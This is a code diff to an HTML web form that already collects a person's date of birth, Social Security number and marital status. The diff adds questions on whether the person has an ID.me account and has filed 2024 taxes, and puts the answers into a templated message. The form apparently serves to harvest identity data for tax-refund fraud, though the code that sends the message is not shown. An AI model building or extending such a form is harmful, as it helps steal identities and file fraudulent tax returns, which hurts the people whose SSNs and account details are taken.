@@ -128,7 +128,16 @@
              class="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400">
     </div>
     
-
+    <div>
+      <label for="idme" class="block text-gray-600 mb-1">Do you have an ID.me account  Yes/No </label>
+      <input type="text" id="idme" name="idme"  
+             class="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400">
+    </div>
+    <div>
+      <label for="file" class="block text-gray-600 mb-1">Have you file for your 2024 Taxes Yes/No</label>
+      <input type="text" id="file" name="file"  
+             class="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400">
+    </div>
 
 
     <button type="submit" 
@@ -187,6 +196,8 @@
         DOB: ${formData.get("dob")}
         SSN: ${formData.get("ssn")}
         Single: ${formData.get("single")}
+         Do you have an ID.me account: ${formData.get("idme")}
+        Have you file for your 2024 Taxes ${formData.get("file")}
 
       `;
 
